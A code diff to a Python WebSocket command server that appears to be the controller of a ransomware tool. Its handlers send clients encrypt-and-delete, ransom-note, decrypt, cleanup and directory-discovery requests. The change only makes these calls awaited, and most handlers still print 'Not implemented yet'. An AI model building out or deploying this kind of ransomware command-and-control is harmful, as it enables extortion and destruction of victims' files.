@@ -116,27 +116,28 @@ class WebSocketCLIServer:
                 case ["cryptoreq", *args]:
                     encrypt = "--encrypt" in args
                     delete = "--delete" in args
-                    self.__send_crypto_req(encrypt, delete)
+                    await self.__send_crypto_req(encrypt, delete)
                     print("Not implemented yet", encrypt, delete)
 
                 case ["encryptionreq"]:
-                    self.__send_encryption_req()
+                    await self.__send_encryption_req()
                     print("Not implemented yet")
 
                 case ["ransomnotereq"]:
                     print("Not implemented yet")
-                    self.__send_ransom_note_req()
+                    await self.__send_ransom_note_req()
 
                 case ["cryptorep"]:
                     print("Not implemented yet")
-                    self.__send_decrypt_rep()
+                    await self.__send_decrypt_rep()
 
                 case ["cleaningreq"]:
                     print("Not implemented yet")
-                    self.__send_cleaning_req()
+                    await self.__send_cleaning_req()
 
                 case ["exit"] | ["quit"]:  
                     await self.stop()
+
                 case _:
                     print(f"Unknown command: {msg}")
 
@@ -209,7 +210,6 @@ class WebSocketCLIServer:
     @check_selected_client
     async def __send_discovery_req(self, path="/"):
         """Send a discovery request to the selected client."""
-        #TODO: Implement discovery request
         message = {
             "type": "discovery_req",
             "data": {
